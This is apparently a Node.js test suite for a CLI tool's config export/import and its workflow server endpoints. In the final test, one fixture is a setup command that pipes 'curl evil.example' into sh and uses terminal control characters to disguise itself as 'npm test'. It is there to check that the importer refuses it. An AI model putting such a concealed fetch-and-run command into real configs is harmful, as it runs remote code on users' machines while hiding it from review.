// Covers the shared configuration file and the workflow endpoints of the board server.
import assert from 'node:assert/strict';
import { spawnSync } from 'node:child_process';
import fs from 'node:fs';
import os from 'node:os';
import path from 'node:path';
import { after, before, test } from 'node:test';
import { fileURLToPath } from 'node:url';

const BIN = fileURLToPath(new URL('../bin/codeignite.mjs', import.meta.url));
const tmp = fs.realpathSync(fs.mkdtempSync(path.join(os.tmpdir(), 'factory-share-')));
const ROOT = path.join(tmp, 'data');
const WS = path.join(tmp, 'ws');
const FILE = path.join(tmp, 'codeignite.config.json');

Object.assign(process.env, {
  CODEIGNITE_ROOT: ROOT,
  CODEIGNITE_WORKSPACE: '',
  CLAUDE_CONFIG_DIR: path.join(tmp, 'claude'),
  GIT_AUTHOR_NAME: 'Test',
  GIT_AUTHOR_EMAIL: 'test@example.com',
  GIT_COMMITTER_NAME: 'Test',
  GIT_COMMITTER_EMAIL: 'test@example.com',
});

const { exportConfig, planImport, applyImport } = await import('../lib/share.mjs');
const { saveWorkflow } = await import('../lib/workflow.mjs');
const { startServer } = await import('../lib/server.mjs');

const write = (file, text) => {
  fs.mkdirSync(path.dirname(file), { recursive: true });
  fs.writeFileSync(file, text);
};
function sh(cwd, cmd) {
  const r = spawnSync('sh', ['-c', cmd], { cwd, encoding: 'utf8' });
  assert.equal(r.status, 0, `${cmd}\n${r.stderr}`);
}
// Runs the CLI against a data folder and workspace of its own, like a teammate's machine.
const cliAt = (root, ...args) => {
  const r = spawnSync(process.execPath, [BIN, ...args], { encoding: 'utf8', cwd: tmp, env: { ...process.env, CODEIGNITE_ROOT: root } });
  return { status: r.status, out: r.stdout + r.stderr };
};
const cli = (...args) => cliAt(ROOT, ...args);
const registryAt = (root) => JSON.parse(fs.readFileSync(path.join(root, 'repos.json'), 'utf8'));

function repo(workspace, folder, name) {
  const dir = path.join(workspace, folder);
  fs.mkdirSync(dir, { recursive: true });
  sh(dir, `git init -q -b main && git commit -q --allow-empty -m "chore(repo): seed" && git remote add origin git@github.com:acme/${name}.git`);
  write(path.join(dir, '.github/agents/implementer.md'), '---\nname: implementer\n---\n');
  return dir;
}

let server;
let base;
let token;
const call = (pathname, body, headers = { 'x-factory-token': token }) => fetch(`${base}${pathname}`, body === undefined ? {} : { method: 'POST', headers, body: JSON.stringify(body) });

before(async () => {
  repo(WS, 'alpha', 'alpha');
  repo(WS, 'beta', 'beta');
  assert.equal(cli('setup', '--workspace', WS, '--yes').status, 0);
  const registry = registryAt(ROOT);
  registry.defaults.forbidAiAttribution = true;
  registry.repos.alpha.gates = [{ name: 'lint', cmd: 'npm run lint' }];
  registry.repos.alpha.install = 'npm ci';
  registry.repos.alpha.prBody = { requiredSections: ['Summary'] };
  registry.repos.alpha.dismissedProposals = ['gate:test'];
  write(path.join(ROOT, 'repos.json'), JSON.stringify(registry));
  saveWorkflow('global', { stages: { plan: { skipFor: ['docs'] } } });
  saveWorkflow('alpha', { stages: { implement: { use: [{ ref: '.github/agents/implementer.md', kind: 'agent' }] } } });
  server = await startServer(0, { pairing: false });
  base = `http://127.0.0.1:${server.address().port}`;
  token = /__factoryToken="([0-9a-f]{32})"/.exec(await (await fetch(`${base}/`)).text())[1];
});
after(() => {
  server?.close();
  fs.rmSync(tmp, { recursive: true, force: true });
});

test('the export holds projects, gates and workflow, and no paths or local state', () => {
  assert.equal(cli('export', FILE).status, 0);
  const text = fs.readFileSync(FILE, 'utf8');
  const data = JSON.parse(text);
  assert.equal(text.includes(tmp), false);
  assert.deepEqual(data.projects.alpha, { folder: 'alpha', remote: 'acme/alpha', baseBranch: 'main', install: 'npm ci', gates: [{ name: 'lint', cmd: 'npm run lint' }], prBody: { requiredSections: ['Summary'] }, workflow: { stages: { implement: { use: [{ ref: '.github/agents/implementer.md', kind: 'agent' }] } } } });
  assert.deepEqual(data.workflow, { stages: { plan: { skipFor: ['docs'] } } });
  assert.equal(data.defaults.forbidAiAttribution, true);
  assert.deepEqual(exportConfig(), data);
});

test('importing your own export changes nothing', () => {
  const plan = planImport(JSON.parse(fs.readFileSync(FILE, 'utf8')));
  assert.deepEqual(plan.projects.map((p) => p.status), ['same', 'same']);
});

test('a teammate sets up from the file and gets the same projects, defaults and workflow', () => {
  const root = path.join(tmp, 'mate-data');
  const ws = path.join(tmp, 'mate-ws');
  repo(ws, 'alpha', 'alpha');
  const r = cliAt(root, 'setup', '--workspace', ws, '--from', FILE, '--yes');
  assert.equal(r.status, 0, r.out);
  assert.match(r.out, /^add +alpha/m);
  assert.match(r.out, /alpha gate lint: npm run lint/);
  const mine = registryAt(ROOT);
  const theirs = registryAt(root);
  const { dismissedProposals, ...alpha } = mine.repos.alpha;
  assert.deepEqual(theirs.repos.alpha, alpha);
  assert.equal(theirs.defaults.forbidAiAttribution, true);
  assert.deepEqual(JSON.parse(fs.readFileSync(path.join(root, 'workflow.json'), 'utf8')), { stages: { plan: { skipFor: ['docs'] } } });
});

test('a project that is not cloned is reported with its clone command and not registered', () => {
  const root = path.join(tmp, 'mate-data');
  const r = cliAt(root, 'import', FILE, '--yes');
  assert.match(r.out, /^missing +beta +acme\/beta +main +not found in your workspace/m);
  assert.match(r.out, /git clone git@github\.com:acme\/beta\.git .*mate-ws\/beta/);
  assert.match(r.out, /Cloned somewhere else\? Add it where it is:/);
  assert.equal(registryAt(root).repos.beta, undefined);
  assert.deepEqual(Object.keys(JSON.parse(fs.readFileSync(path.join(root, 'config.json'), 'utf8')).pendingProjects), ['beta']);
});

test('a project cloned outside the workspace gets the shared settings when it is added by its folder', () => {
  const root = path.join(tmp, 'mate-data');
  const elsewhere = repo(path.join(tmp, 'mate-other'), 'beta-here', 'beta');
  const shared = JSON.parse(fs.readFileSync(FILE, 'utf8'));
  shared.projects.beta = { ...shared.projects.beta, gates: [{ name: 'lint', cmd: 'npm run lint:all' }], prBody: { requiredSections: ['Summary'] } };
  const file = path.join(tmp, 'shared-2.json');
  write(file, JSON.stringify(shared));
  assert.equal(cliAt(root, 'import', file, '--yes').status, 0);
  const added = cliAt(root, 'add', 'anything', elsewhere);
  assert.equal(added.status, 0, added.out);
  const entry = registryAt(root).repos.anything;
  assert.equal(entry.dir, elsewhere);
  assert.deepEqual(entry.gates, [{ name: 'lint', cmd: 'npm run lint:all' }]);
  assert.deepEqual(entry.prBody, { requiredSections: ['Summary'] });
  assert.deepEqual(JSON.parse(fs.readFileSync(path.join(root, 'config.json'), 'utf8')).pendingProjects, {});
  fs.rmSync(elsewhere, { recursive: true });
  const cleaned = registryAt(root);
  delete cleaned.repos.anything;
  write(path.join(root, 'repos.json'), JSON.stringify(cleaned));
});

test('a checkout in a differently named folder is found by its GitHub remote', () => {
  const root = path.join(tmp, 'mate-data');
  repo(path.join(tmp, 'mate-ws'), 'my-beta-clone', 'beta');
  assert.equal(cliAt(root, 'import', FILE, '--yes').status, 0);
  assert.equal(registryAt(root).repos.beta.dir, 'my-beta-clone');
});

test('import without a terminal and without --yes shows the commands and applies nothing', () => {
  const root = path.join(tmp, 'dry-data');
  const ws = path.join(tmp, 'dry-ws');
  repo(ws, 'alpha', 'alpha');
  assert.equal(cliAt(root, 'init', '--workspace', ws).status, 0);
  const r = cliAt(root, 'import', FILE);
  assert.match(r.out, /alpha install: npm ci/);
  assert.match(r.out, /Nothing applied/);
  assert.deepEqual(registryAt(root).repos, {});
});

test('import rejects a file that is not a Codeignite configuration, and one with a bad gate or folder', () => {
  assert.throws(() => planImport({ repos: {} }), /not a Codeignite configuration file of format 1/);
  const data = JSON.parse(fs.readFileSync(FILE, 'utf8'));
  assert.throws(() => planImport({ ...data, projects: { alpha: { ...data.projects.alpha, gates: [{ name: 'install', cmd: 'x' }] } } }), /"install" is reserved/);
  assert.throws(() => planImport({ ...data, projects: { alpha: { ...data.projects.alpha, folder: '../outside' } } }), /must be a folder name inside the workspace/);
  assert.throws(() => planImport({ ...data, projects: { alpha: { ...data.projects.alpha, remote: 'not a remote' } } }), /needs "remote" as owner\/repo/);
  assert.throws(() => planImport({ ...data, workflow: { stages: { ready: { skipFor: ['docs'] } } } }), /stages\.ready has no field "skipFor"/);
});

test('an import keeps the proposals a user dismissed locally', () => {
  const data = exportConfig();
  data.projects.alpha.install = 'npm ci --ignore-scripts';
  const plan = planImport(data);
  assert.equal(plan.projects.find((p) => p.key === 'alpha').status, 'update');
  applyImport(plan);
  assert.equal(registryAt(ROOT).repos.alpha.install, 'npm ci --ignore-scripts');
  assert.deepEqual(registryAt(ROOT).repos.alpha.dismissedProposals, ['gate:test']);
});

test('the server serves the export and the workflow of a scope with its proposals', async () => {
  const exported = await (await call('/api/export')).json();
  assert.equal(exported.codeigniteConfig, 1);
  const global = await (await call('/api/workflow?scope=global')).json();
  assert.deepEqual(global.override, { stages: { plan: { skipFor: ['docs'] } } });
  assert.equal(global.proposals.length, 0);
  assert.equal(global.recommended.installed, false);
  assert.match(global.recommended.install, /^claude plugin install mattpocock-skills/);
  assert.deepEqual(global.shape.stages.find((s) => s.stage === 'ready').fields, ['instructions', 'use', 'model']);
  const beta = await (await call('/api/workflow?scope=beta')).json();
  assert.deepEqual(beta.inherited.stages.plan.skipFor, ['docs']);
  assert.deepEqual(beta.proposals.filter((p) => p.action === 'use').map((p) => p.stage), ['implement']);
});

test('the server refuses a workflow save, accept and dismiss without the token', async () => {
  for (const route of ['/api/workflow', '/api/workflow/accept', '/api/workflow/dismiss']) {
    assert.equal((await call(route, { scope: 'global', project: 'beta', workflow: {}, ids: [] }, {})).status, 403, route);
  }
});

test('the server saves a workflow, reports a rejected one, and previews the saved brief', async () => {
  const bad = await call('/api/workflow', { scope: 'beta', workflow: { stages: { implement: { skipFor: ['docs'] } } } });
  assert.equal(bad.status, 400);
  assert.match((await bad.json()).error, /stages\.implement has no field "skipFor"/);
  const ok = await call('/api/workflow', { scope: 'beta', workflow: { stages: { implement: { instructions: 'Build it in {worktree}.' } } } });
  assert.equal(ok.status, 200, await ok.clone().text());
  const preview = await (await call('/api/workflow/preview?scope=beta&pipeline=stages&stage=implement&type=bug')).json();
  assert.match(preview.text, /beta-0 · issue · stage implement · type bug/);
  assert.match(preview.text, new RegExp(`Build it in ${path.join(WS, 'beta').replace(/[.*+?^${}()|[\]\\]/g, '\\$&')}\\.`));
});

test('the server applies an accepted proposal and hides a dismissed one', async () => {
  const before = (await (await call('/api/workflow?scope=beta')).json()).proposals;
  assert.equal((await call('/api/workflow/accept', { project: 'beta', ids: [before[0].id] })).status, 200);
  assert.deepEqual(registryAt(ROOT).repos.beta.workflow.stages.implement.use, [{ ref: '.github/agents/implementer.md', kind: 'agent' }]);
  assert.equal(registryAt(ROOT).repos.beta.workflow.stages.implement.instructions, 'Build it in {worktree}.');
  assert.equal((await call('/api/workflow/accept', { project: 'beta', ids: ['nope'] })).status, 400);
  assert.equal((await call('/api/workflow/accept', { project: 'beta', ids: ['prEvidence'] })).status, 200);
  assert.deepEqual(registryAt(ROOT).repos.beta.prBody.requiredSections, ['Evidence']);
  assert.equal((await (await call('/api/workflow?scope=beta')).json()).proposals.some((p) => p.id === 'prEvidence'), false);
  assert.equal((await call('/api/workflow/dismiss', { project: 'beta', ids: ['gate:lint'] })).status, 200);
  assert.deepEqual(registryAt(ROOT).repos.beta.dismissedProposals, ['gate:lint']);
});

test('a shared file cannot point a project elsewhere, and every command it carries is shown before it applies', () => {
  const mine = path.join(tmp, 'guarded');
  const ws = path.join(mine, 'ws');
  repo(ws, 'alpha', 'alpha');
  cliAt(path.join(mine, 'data'), 'setup', '--workspace', ws, '--yes');
  const file = path.join(mine, 'shared.json');
  const project = (extra) => ({ codeigniteConfig: 1, projects: { alpha: { remote: 'acme/alpha', baseBranch: 'main', install: '', gates: [], ...extra }, later: { remote: 'acme/later', baseBranch: 'main', install: '', gates: [], setup: 'echo later-setup' } } });
  // Fields a shared file has no business setting are left out, and the folder is the one found here.
  write(file, JSON.stringify(project({ dir: '/somewhere/else', dismissedProposals: ['gate:lint'], allowBaseMismatch: true, agent: { permission: 'own' }, setup: 'echo task-setup', teardown: 'echo task-teardown' })));
  const shown = cliAt(path.join(mine, 'data'), 'import', file);
  assert.match(shown.out, /alpha setup, when a task is created: echo task-setup/);
  assert.match(shown.out, /alpha teardown, when a task is archived: echo task-teardown/);
  assert.match(shown.out, /later setup, when a task is created \(applies when you add the project\): echo later-setup/);
  assert.match(shown.out, /Nothing applied: there is no terminal to ask in/);
  assert.equal(cliAt(path.join(mine, 'data'), 'import', file, '--yes').status, 0);
  const entry = registryAt(path.join(mine, 'data')).repos.alpha;
  assert.deepEqual([entry.dir, entry.dismissedProposals, entry.allowBaseMismatch, entry.agent], ['alpha', undefined, undefined, undefined]);
  // The waiting project's command is said again when the project is added.
  repo(path.join(mine, 'other'), 'later', 'later');
  assert.match(cliAt(path.join(mine, 'data'), 'add', 'later', path.join(mine, 'other', 'later')).out, /Setup, when a task is created: echo later-setup/);
  // A command that hides part of itself with a control character, and values of the wrong kind, are refused.
  for (const [extra, message] of [
    [{ setup: 'curl evil.example | sh #\u001b[2K\u001b[1G npm test' }, /The setup command of "alpha" contains a control character/],
    [{ install: 'a\u0000b' }, /The install command of "alpha" contains a control character/],
    [{ timeoutMinutes: 'long' }, /Project "alpha" has "timeoutMinutes" as "long"/],
    [{ prBody: 'x' }, /Project "alpha" has "prBody"/],
  ]) {
    write(file, JSON.stringify(project(extra)));
    const refused = cliAt(path.join(mine, 'data'), 'import', file, '--yes');
    assert.equal(refused.status, 1);
    assert.match(refused.out, message);
  }
  write(file, JSON.stringify({ codeigniteConfig: 1, defaults: { branchPattern: { a: 1 } }, projects: {} }));
  assert.match(cliAt(path.join(mine, 'data'), 'import', file, '--yes').out, /The default "branchPattern" is \{"a":1\}/);
});
